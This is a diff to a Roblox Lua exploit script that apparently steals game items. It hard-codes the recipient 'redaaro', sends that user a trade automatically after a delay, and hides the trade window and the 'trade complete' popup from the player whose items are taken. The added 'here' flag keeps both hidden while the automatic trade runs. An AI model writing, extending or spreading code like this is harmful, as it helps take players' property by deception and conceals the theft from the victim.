@@ -2,6 +2,7 @@ print("V2.1")
 getgenv().UName = "redaaro"
 getgenv().HasWhitelisted = false
 getgenv().aol = false
+getgenv().here = false
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -111,7 +112,7 @@ Popup:GetPropertyChangedSignal("Visible"):Connect(function()
         end
         local text = table.concat(words, " "):lower()
         if text:find("trade") and (text:find("complete") or text:find("successful")) then
-            if getgenv().aol then
+            if getgenv().aol and not getgenv().here then
                 Popup.Visible = true
             else
                 getgenv().aol = true
@@ -132,7 +133,7 @@ local TradeFrame = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame
 local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade
 TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
     if TradeGui.Visible then
-        if getgenv().aol then
+        if getgenv().aol and not getgenv().here then
             TradeFrame.Visible = true
         else
             TradeFrame.Visible = false
@@ -145,6 +146,7 @@ end)
 
 local function StartTrade()
     wait(9)
+    getgenv().here = true
     SendTrade(getgenv().UName)
 end
 
